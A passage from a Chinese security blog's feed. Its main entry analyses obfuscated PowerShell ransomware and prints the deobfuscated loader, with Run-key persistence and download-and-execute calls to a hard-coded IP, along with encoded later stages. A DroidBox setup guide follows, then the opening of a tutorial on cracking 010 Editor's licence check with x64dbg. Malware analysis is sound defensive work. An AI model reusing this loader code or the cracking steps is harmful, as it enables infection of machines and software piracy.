class="number">100</span>+[<span class="built_in">char</span>]<span class="number">107</span>),[<span class="built_in">char</span>]<span class="number">34</span>)+<span class="variable">$</span>&#123;destination&#125;+(((<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ig5ig5 o0m&#x27;</span>,<span class="string">&#x27;x u&#x27;</span>,<span class="string">&#x27;2q&#x27;</span>,<span class="string">&#x27; ie&#x27;</span>)).(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;place&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).invoke(<span class="string">&#x27;o0m&#x27;</span>,<span class="string">&#x27;|&#x27;</span>).<span class="string">&quot;replace&quot;</span>(([<span class="built_in">char</span>]<span class="number">73</span>+[<span class="built_in">char</span>]<span class="number">103</span>+[<span class="built_in">char</span>]<span class="number">53</span>),[<span class="built_in">string</span>][<span class="built_in">char</span>]<span class="number">39</span>).<span class="string">&quot;replace&quot;</span>(<span class="string">&#x27;u2q&#x27;</span>,[<span class="type">s</span></span><br><span class="line"><span class="type">tring</span>][<span class="built_in">char</span>]<span class="number">34</span>))</span><br><span class="line">&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;new&#x27;</span>,<span class="string">&#x27;property&#x27;</span>,<span class="string">&#x27;-item&#x27;</span>) <span class="literal">-path</span> (((<span class="string">&quot;&#123;5&#125;&#123;4&#125;&#123;3&#125;&#123;8&#125;&#123;11&#125;&#123;6&#125;&#123;1&#125;&#123;2&#125;&#123;9&#125;&#123;10&#125;&#123;0&#125;&#123;7&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;sr&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;windowsk7s&#x27;</span>,<span class="string">&#x27;u:k7&#x27;</span>,<span class="string">&#x27;kc&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;smicrosoftk7&#x27;</span>,<span class="string">&#x27;un&#x27;</span>,<span class="string">&#x27;ssoftware&#x27;</span>,<span class="string">&#x27;curre&#x27;</span>,<span class="string">&#x27;ntversionk7&#x27;</span>,<span class="string">&#x27;k7&#x27;</span>))  <span class="operator">-replace</span> ([<span class="built_in">char</span>]<span class="number">107</span>+[<span class="built_in">char</span>]<span class="number">55</span>+[<span class="built_in">char</span>]<span class="number">115</span>),[<span class="built_in">char</span>]<span class="number">92</span>) <span class="literal">-nam</span></span><br><span class="line">e <span class="variable">$</span>&#123;rand&#125; <span class="literal">-value</span> <span class="variable">$</span>&#123;autorunstring&#125; <span class="literal">-propertytype</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;trin&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) <span class="literal">-force</span> | &amp;(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;ll&#x27;</span>,<span class="string">&#x27;out-n&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load-nextstage</span></span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">param</span>(<span class="variable">$</span>&#123;endpoint&#125;) <span class="comment">##load.php文件</span></span><br><span class="line">    <span class="variable">$</span>&#123;remotehost&#125; = &amp;(<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;mar&#x27;</span>,<span class="string">&#x27;ray&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;get-h&#x27;</span>,<span class="string">&#x27;tfro&#x27;</span>) <span class="comment">##get-hostfromarray</span></span><br><span class="line">    <span class="variable">$</span>&#123;uri&#125; = <span class="variable">$</span>&#123;remotehost&#125; + <span class="string">&quot;/&quot;</span> + <span class="variable">$</span>&#123;endpoint&#125; </span><br><span class="line"><span class="keyword">return</span> (&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;new-&#x27;</span>,<span class="string">&#x27;ct&#x27;</span>,<span class="string">&#x27;obje&#x27;</span>) (<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;client&#x27;</span>,<span class="string">&#x27;net.&#x27;</span>,<span class="string">&#x27;web&#x27;</span>)).(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ing&#x27;</span>,<span class="string">&#x27;oa&#x27;</span>,<span class="string">&#x27;downl&#x27;</span>,<span class="string">&#x27;dstr&#x27;</span>).invoke(<span class="variable">$</span>&#123;uri&#125;)  <span class="comment">##</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decide-scout</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$</span>&#123;ad&#125; = &amp;(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;isinad&#x27;</span>,<span class="string">&#x27;et-&#x27;</span>,<span class="string">&#x27;g&#x27;</span>) <span class="comment">## get-isinad</span></span><br><span class="line">    <span class="variable">$</span>&#123;tw&#125; = &amp;(<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;get-ist&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;amviewerinst&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;lled&#x27;</span>)  <span class="comment">##get-isteamviewerinstalled</span></span><br><span class="line">    <span class="variable">$</span>&#123;rdp&#125; = &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;pses&#x27;</span>,<span class="string">&#x27;get-isrd&#x27;</span>,<span class="string">&#x27;si&#x27;</span>,<span class="string">&#x27;ons&#x27;</span>)  <span class="comment">##get-isrdpsessions</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$</span>&#123;ad&#125; <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;) <span class="operator">-or</span> (<span class="variable">$</span>&#123;tw&#125; <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;) <span class="operator">-or</span> (<span class="variable">$</span>&#123;rdp&#125; <span class="operator">-eq</span> <span class="variable">$</span>&#123;true&#125;))  <span class="comment">##判断当前主机是否在域中或者安装有teamviewer或有远程桌面连接的session</span></span><br><span class="line">&#123;</span><br><span class="line">&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;ex&#x27;</span>)(&amp;(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;nextst&#x27;</span>,<span class="string">&#x27;load&#x27;</span>) <span class="variable">$</span>&#123;tinyendpoint&#125;)  <span class="comment">##load-nextstage</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line"><span class="variable">$</span>&#123;lock&#125; = &amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;tage&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;oad-&#x27;</span>,<span class="string">&#x27;nexts&#x27;</span>)(<span class="variable">$</span>&#123;lockendpoint&#125;)  <span class="comment">##进行文件加密</span></span><br><span class="line">        .(<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;-lo&#x27;</span>,<span class="string">&#x27;ck&#x27;</span>,<span class="string">&#x27;per&#x27;</span>,<span class="string">&#x27;sist&#x27;</span>) <span class="variable">$</span>&#123;lock&#125;</span><br><span class="line">&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;ex&#x27;</span>)(<span class="variable">$</span>&#123;lock&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">.decide<span class="literal">-scout</span></span><br></pre></td></tr></table></figure><ul><li>执行这段脚本，其会检测当前主机是否在域中、是否安装有teamviewer、是否有远程桌面的sessions，检测存在则下载<a href="http://45.61.138.170/load.php中的字符串并执行，检测不存在则直接下载http://45.61.138.170/web/index.php?r=site/loadlock中的字符串解析执行，从两个文件中的内容可以推测出load.php是一个驻留程序，lock是一个加密程序。">http://45.61.138.170/load.php中的字符串并执行，检测不存在则直接下载http://45.61.138.170/web/index.php?r=site/loadlock中的字符串解析执行，从两个文件中的内容可以推测出load.php是一个驻留程序，lock是一个加密程序。</a></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200715111942595.png" alt="image-20200715111942595"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200715112043254.png" alt="image-20200715112043254"></p><h4 id="驻留程序分析"><a href="#驻留程序分析" class="headerlink" title="驻留程序分析"></a>驻留程序分析</h4><ul><li>load.php脚本内容如下，其使用了大量的字符串替换对硬编码数据进行base64解码，然后调用io.memorysteam进行数据解压缩，然后使用iex执行</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;LE&#x27;</span>,<span class="string">&#x27;SEt-vAR&#x27;</span>,<span class="string">&#x27;IaB&#x27;</span>)  (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;h6jK&#x27;</span>,<span class="string">&#x27;l2&#x27;</span>)  ([<span class="type">tYpE</span>](<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-F</span> <span class="string">&#x27;convE&#x27;</span>,<span class="string">&#x27;Rt&#x27;</span>))  ;  </span><br><span class="line">&amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;t-itEm&#x27;</span>,<span class="string">&#x27;sE&#x27;</span>) (<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;0V&#x27;</span>,<span class="string">&#x27;IAblE:6d&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;V&#x27;</span>) ([<span class="type">TyPE</span>](<span class="string">&quot;&#123;7&#125;&#123;3&#125;&#123;10&#125;&#123;1&#125;&#123;5&#125;&#123;9&#125;&#123;4&#125;&#123;8&#125;&#123;0&#125;&#123;6&#125;&#123;2&#125;&quot;</span> <span class="operator">-F</span> <span class="string">&#x27;Si&#x27;</span>,<span class="string">&#x27;eM.Io&#x27;</span>,<span class="string">&#x27;Mode&#x27;</span>,<span class="string">&#x27;YS&#x27;</span>,<span class="string">&#x27;siOn.cOMp&#x27;</span>,<span class="string">&#x27;.COMprE&#x27;</span>,<span class="string">&#x27;On&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;reS&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;t&#x27;</span>));</span><br><span class="line">&amp;(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;-ITE&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;sEt&#x27;</span>)  (<span class="string">&#x27;va&#x27;</span>+<span class="string">&#x27;Ri&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;blE:0bT&#x27;</span>) ([<span class="type">TYpe</span>](<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;oDInG&#x27;</span>,<span class="string">&#x27;T.E&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;ysTem.TEx&#x27;</span>,<span class="string">&#x27;nC&#x27;</span>)); </span><br><span class="line">(&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;nEW-obj&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;Ct&#x27;</span>)  (<span class="string">&quot;&#123;5&#125;&#123;1&#125;&#123;0&#125;&#123;2&#125;&#123;4&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;o.&#x27;</span>,<span class="string">&#x27;Ystem.i&#x27;</span>,<span class="string">&#x27;coMPrESS&#x27;</span>,<span class="string">&#x27;on.DEFLatEStreaM&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;s&#x27;</span>)( [<span class="type">IO.memoRYstREam</span>](&amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;BlE&#x27;</span>,<span class="string">&#x27;GeT-&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;AriA&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;H6&#x27;</span>,<span class="string">&#x27;Kl2&#x27;</span>,<span class="string">&#x27;j&#x27;</span>)  <span class="literal">-VAL</span>)::(<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;0&#125;&#123;1&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;BasE&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;OM&#x27;</span>,<span class="string">&#x27;fr&#x27;</span>,<span class="string">&#x27;stRING&#x27;</span>).Invoke( (<span class="string">&quot;&#123;113&#125;&#123;20&#125;&#123;73&#125;&#123;11&#125;&#123;64&#125;&#123;110&#125;&#123;2&#125;&#123;58&#125;&#123;3&#125;&#123;93&#125;&#123;90&#125;&#123;43&#125;&#123;109&#125;&#123;98&#125;&#123;107&#125;&#123;32&#125;&#123;6&#125;&#123;74&#125;&#123;111&#125;&#123;34&#125;&#123;56&#125;&#123;66&#125;&#123;47&#125;&#123;37&#125;&#123;27&#125;&#123;75&#125;&#123;102&#125;&#123;5&#125;&#123;99&#125;&#123;23&#125;&#123;55&#125;&#123;86&#125;&#123;60&#125;&#123;41&#125;&#123;83&#125;&#123;94&#125;&#123;97&#125;&#123;53&#125;&#123;84&#125;&#123;59&#125;&#123;48&#125;&#123;63&#125;&#123;31&#125;&#123;89&#125;&#123;22&#125;&#123;45&#125;&#123;101&#125;&#123;104&#125;&#123;81&#125;&#123;105&#125;&#123;42&#125;&#123;19&#125;&#123;85&#125;&#123;33&#125;&#123;52&#125;&#123;54&#125;&#123;51&#125;&#123;24&#125;&#123;4&#125;&#123;65&#125;&#123;16&#125;&#123;17&#125;&#123;114&#125;&#123;87&#125;&#123;44&#125;&#123;0&#125;&#123;10&#125;&#123;50&#125;&#123;95&#125;&#123;67&#125;&#123;100&#125;&#123;14&#125;&#123;106&#125;&#123;78&#125;&#123;92&#125;&#123;21&#125;&#123;68&#125;&#123;7&#125;&#123;25&#125;&#123;79&#125;&#123;77&#125;&#123;82&#125;&#123;26&#125;&#123;49&#125;&#123;35&#125;&#123;69&#125;&#123;96&#125;&#123;18&#125;&#123;15&#125;&#123;62&#125;&#123;39&#125;&#123;88&#125;&#123;80&#125;&#123;70&#125;&#123;1&#125;&#123;76&#125;&#123;108&#125;&#123;115&#125;&#123;36&#125;&#123;71&#125;&#123;46&#125;&#123;40&#125;&#123;72&#125;&#123;112&#125;&#123;30&#125;&#123;9&#125;&#123;13&#125;&#123;29&#125;&#123;8&#125;&#123;28&#125;&#123;61&#125;&#123;91&#125;&#123;103&#125;&#123;57&#125;&#123;38&#125;&#123;12&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;gGr9FfdarP0/l9gj9RD6EuU/35Qg+9fJx5TvpV9ZWqG/L5dt4z73auPsN79IftfDWX8xleg56N9j7Ohc/SY9Q/N9V/PKEXWQd1Sg0XUa/gnn52DgFXS2+WfJi6Hf3+/J7hYfSpDcGH/o+rc1lqHNu26C/5AR8gwoSChqRQg4bUpWESQ1vYX38izh5jLlGtintPVSbY0t5rzeeZ9+gH3z/3LbhPF5/Go/bnd+7BId93e+6W6F+838VPVt5j+ZshObZ8b118e+rZzL02H/253pPX8HJDF50l/rF23kzx26l/zXvxzTwvDnvkezjUXCx+yV7bo2e52Ctr7uhrPr/kgYir+pzCs4x/cuGXLnmAs3hu9hBzY5/5ef+hu1H/ZM6Wn8uD+xodZbfL4yHnOX5Qcrwu9Ej09jeZx25/nzkQb+w1vufV*****省略&#x27;</span>) ),  (&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;Di&#x27;</span>,<span class="string">&#x27;R&#x27;</span>)  (<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;E:&#x27;</span>,<span class="string">&#x27;6D0v&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;VAR&#x27;</span>,<span class="string">&#x27;aBL&#x27;</span>) ).<span class="string">&quot;VaL`Ue&quot;</span>::<span class="string">&quot;deco`Mp`REss&quot;</span> ) |&amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;OREaCH&#x27;</span>,<span class="string">&#x27;F&#x27;</span>) &#123; &amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;nEW&#x27;</span>,<span class="string">&#x27;-o&#x27;</span>,<span class="string">&#x27;bjECt&#x27;</span>) (<span class="string">&quot;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;5&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ys&#x27;</span>,<span class="string">&#x27;tEM.iO.STReaMR&#x27;</span>,<span class="string">&#x27;eA&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;Er&#x27;</span>)(<span class="variable">$</span>&#123;_&#125;, (  &amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;CI&#x27;</span>) (<span class="string">&#x27;va&#x27;</span>+<span class="string">&#x27;Ri&#x27;</span>+<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;BLe:0bT&#x27;</span>)).<span class="string">&quot;vAl`Ue&quot;</span>::<span class="string">&quot;aS`cii&quot;</span>) &#125; ).(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;END&#x27;</span>,<span class="string">&#x27;Re&#x27;</span>,<span class="string">&#x27;adTO&#x27;</span>).Invoke()|&amp;<span class="built_in">iex</span></span><br></pre></td></tr></table></figure><ul><li>在ps调试命令行中输出解密后的数据如下，使用安全字符串对硬编码的字符串进行解密，使用invoke-expression执行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">invoke-expression( </span><br><span class="line">(new-object  management.automation.pscredential &#x27;&#x27;,</span><br><span class="line">(&#x27;76492d1116743f0423413b16050a5345MgB8AGMAawBIAHkASQBmAFcANQBvAEIAVgBYAHUAbwB0AHEATwBjAFIANQAvAFEAPQA9AHwAZQA5AGEAMwBiADQANAA2ADkAYQAyAGYANgBhADEAOQA0ADcANQAzAGUAMABmADQAMwAyADYAZABjAGMAZABkADAAMQA0ADgAMQAwAGEAZgA1ADcAOQBkADEAYwBiADUAMgA3ADgAOAA1ADYAZQAyADIANgBlAGIANwBiAGQAZAA5ADAAYwA3ADEAMwA4ADEAOQBkADYAYwBlADEAZQAwADYAMwBlADEAMwBiAGEANQAyAGYANQA1AGIAMwBjAGMAOQA1ADkAMwBmADQAYwAwAGYAMQAwADEAYgAxADQAMQA2AGMAZQA4ADAAOAA4ADYANQAxAGUA***省略&#x27;|cOnvERTtO-SecUReStRiNG -key  (200..177))</span><br><span class="line">).getnetworkcredential().password)</span><br></pre></td></tr></table></figure><ul><li>再次解密，获取到了其核心的程序，下面详细分析其执行流程和功能。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200715120039779.png" alt="image-20200715120039779"></p><ul><li>因为程序中使用了大量的字符串替换操作来提升分析难度,这里简单分析其核心功能，发现其通过主循环来实现命令接受及数据反回</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234404582.png" alt="image-20201122234404582"></p><ul><li>其程序中采用RC4加解密数据</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234448885.png" alt="image-20201122234448885"></p><ul><li>注册表修改</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234526079.png" alt="image-20201122234526079"></p><ul><li>通过分析该程序为一个标准的远控木马，但是从目前获取的信息无法判断其是哪个家族及框架，但该木马的主要特征是利用powershell进行所有的操作，由于powershell的强大，这对用户的影响是巨大的。</li></ul><h4 id="加密程序分析"><a href="#加密程序分析" class="headerlink" title="加密程序分析"></a>加密程序分析</h4><ul><li>lock.php的文件内容似乎是一个C#源代码，通过阅读其源代码发现其具有文件加密的能力，代码如下:</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234945593.png" alt="image-20201122234945593"></p><ul><li>使用RSA算法生成密钥</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122235008525.png" alt="image-20201122235008525"></p><ul><li>加密目录和后缀</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122235056382.png" alt="image-20201122235056382"></p><p>======持续更新</p>]]></content>
    
    <summary type="html">
    
      分析一个多重混淆的powershell病毒
    
    </summary>
    
      <category term="恶意软件分析" scheme="https://richard447.github.io/categories/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
    
      <category term="勒索病毒" scheme="https://richard447.github.io/tags/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>DroidBox配置</title>
    <link href="https://richard447.github.io/2020/03/20/DroidBox%E9%85%8D%E7%BD%AE/"/>
    <id>https://richard447.github.io/2020/03/20/DroidBox配置/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DroidBox配置笔记"><a href="#DroidBox配置笔记" class="headerlink" title="DroidBox配置笔记"></a>DroidBox配置笔记</h1><h4 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h4><ul><li><p>ubuntu16，下载链接：<a href="http://mirrors.aliyun.com/ubuntu-releases/16.04/">http://mirrors.aliyun.com/ubuntu-releases/16.04/</a></p></li><li><p>AndroidSDK，下载链接：<a href="http://www.androiddevtools.cn/#sdk-tools">http://www.androiddevtools.cn/#sdk-tools</a></p></li><li>JDK，下载链接：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a></li><li>DroidBox，下载链接：<a href="https://github.com/pjlantz/droidbox/releases">https://github.com/pjlantz/droidbox/releases</a></li><li>python2环境，因为DroidBox只支持python2的环境，所以这里选择ubuntu16省去python3的配置，若使用ubuntu18需要自行安装python2的环境。</li></ul><h4 id="安装流程"><a href="#安装流程" class="headerlink" title="安装流程"></a>安装流程</h4><ul><li>将AndroidSDK、JDK、DroidBox解压。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320201340940.png" alt="image-20200320201340940"></p><ul><li>然后开始配置JAVA和SDK环境变量，使用命令<code>gedit ~/.bashrc</code>，文件末尾添加以下路径，然后使用命令：<code>source ~/.bashrc</code> ，测试命令：<code>java 、javac</code></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320215340737.png" alt="image-20200320215340737"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320212646854.png" alt="image-20200320212646854"></p><ul><li>下载sdk镜像。使用命令:<code>android</code>，选择如下镜像下载</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320212838599.png" alt="image-20200320212838599"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320212918214.png" alt="image-20200320212918214"></p><p><img src="C:\Users\Demon\AppData\Roaming\Typora\typora-user-images\image-20200320212933610.png" alt="image-20200320212933610"></p><ul><li>安装完可以使用命令: <code>android list target</code>,查看是否安装成功</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320215506440.png" alt="image-20200320215506440"></p><ul><li>开始创建一个虚拟机，输入android命令，在左上角找到SDK Manager中的tools下的Manage AVDs，创建一个，配置如下</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320215700055.png" alt="image-20200320215700055"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320215847057.png" alt="image-20200320215847057"></p><ul><li>尝试运行avd查看是否能正常开机，命令: <code>emulator -avd dTest</code>，需要耐心的等待一会。。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200320220451299.png" alt="image-20200320220451299"></p><h4 id="DroidBox配置"><a href="#DroidBox配置" class="headerlink" title="DroidBox配置"></a>DroidBox配置</h4><ul><li>安装依赖库。安装matplotlib:<code>sudo apt-get install python-matplotlib</code> 换源后可以直接安装，这里使用的是阿里源。</li></ul><h4 id="使用DroidBix分析APK"><a href="#使用DroidBix分析APK" class="headerlink" title="使用DroidBix分析APK"></a>使用DroidBix分析APK</h4><ul><li><p>使用命令：<code>emulator -avd &lt;avd name&gt;</code> 开启之前创建的虚拟机。</p></li><li><p>使用<code>./droidbox apk_path</code>运行apk，这里apk_path替换为apk的完整路径才能保证运行成功。</p></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200321134702899.png" alt="image-20200321134702899"></p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>​        这是个很老的工具，而且已经好几年没人维护了，实际用于动态分析APK时也几乎没有什么效果，所以后续应该会研究下其他新的APK动态分析工具。奈何为了忽悠毕设老师，只能将就着使用下。</p>]]></content>
    
    <summary type="html">
    
      配置个很老的动态分析工具DroidBox
    
    </summary>
    
      <category term="安卓" scheme="https://richard447.github.io/categories/%E5%AE%89%E5%8D%93/"/>
    
    
      <category term="安卓" scheme="https://richard447.github.io/tags/%E5%AE%89%E5%8D%93/"/>
    
  </entry>
  
  <entry>
    <title>010Editor破解(Win10_X64平台)</title>
    <link href="https://richard447.github.io/2020/03/07/010Editor%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/"/>
    <id>https://richard447.github.io/2020/03/07/010Editor破解教程/</id>
    <published>2020-03-07T07:53:26.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在64位win10上破解010editor"><a href="#在64位win10上破解010editor" class="headerlink" title="在64位win10上破解010editor"></a>在64位win10上破解010editor</h1><h6 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h6><ul><li><p>x64dbg</p></li><li><p>010editor最新版</p></li></ul><h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><ul><li>从github上下载x64dbg(<strong><a href="https://github.com/x64dbg/x64dbg/releases">https://github.com/x64dbg/x64dbg/releases</a></strong>)，由于墙的原因下载速度会比较慢。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303135507848.png" alt="image-20200303135507848"></p><ul><li>从010editor官网(<strong><a href="https://www.sweetscape.com/010editor/">https://www.sweetscape.com/010editor/</a></strong>)上下载010editor最新版，安装。- </li></ul><h3 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h3><ul><li>从010editor安装目录，将010Editor.exe拖入x64dbg</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200303135839627.png" alt="image-20200303135839627"></p><ul><li>直接F9运行，010editor会弹出框，让输入账户和密码，输入错误则会弹出下面的框</li></ul><p><img 